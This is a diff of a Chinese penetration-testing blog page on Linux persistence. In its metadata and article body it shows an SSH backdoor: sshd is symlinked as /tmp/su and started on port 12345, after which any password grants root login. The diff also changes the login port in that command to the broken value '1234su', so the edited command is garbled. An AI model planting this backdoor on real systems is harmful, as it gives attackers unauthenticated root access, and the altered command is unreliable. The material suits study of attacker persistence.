@@ -16,19 +16,19 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SSH后门软链接12ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345  # -oport 的意思是监听端口ssh root@192.168.78.19 -p 12345   输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆   Linux的一个后门引发对PAM的探究 - 番茄汁汁 - 博">
+    <meta name="description" content="SSH后门软链接12ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345  # -oport 的意思是监听端口ssh root@192.168.78.19 -p 1234su   输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆   Linux的一个后门引发对PAM的探究 - 番茄汁汁 -">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux权限维持">
 <meta property="og:url" content="https://tsy244.github.io/2024/02/16/%E6%B8%97%E9%80%8F/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="SSH后门软链接12ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345  # -oport 的意思是监听端口ssh root@192.168.78.19 -p 12345   输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆   Linux的一个后门引发对PAM的探究 - 番茄汁汁 - 博">
+<meta property="og:description" content="SSH后门软链接12ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345  # -oport 的意思是监听端口ssh root@192.168.78.19 -p 1234su   输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆   Linux的一个后门引发对PAM的探究 - 番茄汁汁 -">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216161709771.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216163648231.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216164543289.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216170339632.png">
 <meta property="article:published_time" content="2024-02-16T07:54:20.000Z">
-<meta property="article:modified_time" content="2024-02-16T09:36:39.015Z">
+<meta property="article:modified_time" content="2024-02-21T09:02:26.189Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -286,7 +286,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp/su -oport=<span class="hljs-number">12345</span>  <span class="hljs-comment"># -oport 的意思是监听端口</span><br>ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">78.19</span> -p <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>
+                <h1 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h1><h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp/su -oport=<span class="hljs-number">12345</span>  <span class="hljs-comment"># -oport 的意思是监听端口</span><br>ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">78.19</span> -p <span class="hljs-number">1234</span>su<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>输入任意密码就可以 root 用户权限登陆，如果 root 用户被禁止登陆时，可以利用其他存在的用户身份登陆</p>
